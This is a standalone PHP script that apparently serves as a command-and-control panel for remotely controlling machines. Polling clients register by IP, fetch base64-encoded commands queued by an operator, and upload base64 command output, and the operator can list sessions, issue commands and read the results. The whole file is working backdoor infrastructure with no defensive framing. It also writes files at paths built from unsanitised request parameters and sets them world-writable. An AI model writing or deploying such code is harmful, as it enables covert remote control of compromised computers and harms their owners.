<?php

function Trasher ()
{
	$glob = glob (getcwd () . '/ips/*.dat');
	if (count ($glob) > 0)
	{
		foreach ($glob as $i => $sPath)
		{
			$Time = file_get_contents ($sPath);
			if ($Time < time ())
			{
				unlink ($sPath);
				unlink (str_replace ('.dat', '.sh', $sPath));
				unlink (str_replace ('.dat', '.result', $sPath));
			}
		}
	}
}

function SetActive ()
{
	global $_SERVER;
	$ip = $_SERVER ['REMOTE_ADDR'];
	$sPath = getcwd () . "/ips/{$ip}.dat";
	file_put_contents ($sPath, time () + 5); /* +5 sec */
	system ("chmod 0777 {$sPath}");
}

function GetCmd ()
{
	global $_SERVER;
	$sPath = getcwd () . "/ips/{$_SERVER ['REMOTE_ADDR']}.sh";
	if (file_exists ($sPath))
	{
		$sh = file_get_contents ($sPath);
		unlink ($sPath);
		
		echo base64_decode ($sh);
	}
}


Trasher (); 	/*	Remove not active sessions 	*/
if (array_key_exists ("getcmd", $_GET))
{
	SetActive ();	/*	Set new active session		*/
	GetCmd ();		/*	Return cmd command			*/
}


// 
if (array_key_exists ("sessions", $_GET) && $_GET ['sessions'] == 'active')
{
	// Output active sessions
	$sessions 	= [];
	$glob 		= glob (getcwd () . '/ips/*.dat');
	if (count ($glob) > 0)
	{
		foreach ($glob as $i => $sPath)
		{
			$Time = file_get_contents ($sPath);
			if ($Time > time ())
			{
				$i2 			= $i+1;
				$ip				= basename ($sPath, '.dat');
				$sessions [] 	= "      {$i2}. {$ip}";
			}
		}
		
		echo implode ("\n", $sessions);
	}
}
elseif (array_key_exists ("session", $_GET) && array_key_exists ("cmd", $_GET))
{
	// Write cmd command
	$session 	= $_GET ['session'];
	$cmd 		= $_GET ['cmd'];
	
	$sPath1 	= getcwd () . "/ips/{$session}.dat";
	$sPath2 	= getcwd () . "/ips/{$session}.sh";
	
	if (file_exists ($sPath1) && file_get_contents ($sPath1) > time ())
	{
		file_put_contents ($sPath2, trim ($cmd));
		system ("chmod 0777 {$sPath2}");
	}
}
elseif (array_key_exists ("session", $_GET) && array_key_exists ("get", $_GET))
{
	// Get result
	$session 	= $_GET ['session'];
	
	$sPath1 	= getcwd () . "/ips/{$session}.dat";
	$sPath2 	= getcwd () . "/ips/{$session}.result";
	
	if (file_exists ($sPath1) && file_get_contents ($sPath1) > time ())
	{
		$sh = trim (file_get_contents ($sPath2));
		unlink ($sPath2);
		
		if (!empty ($sh))echo $sh;
	}
	else echo "session not active... :(";
}
elseif (array_key_exists ("b", $_GET))
{
	// Set result
	$sPath 	= getcwd () . "/ips/{$_SERVER ['REMOTE_ADDR']}.result";
	$cRes 	= @base64_decode ($_GET ['b']);
	
	file_put_contents ($sPath, trim ($cRes));
	system ("chmod 0777 {$sPath}");
}

?>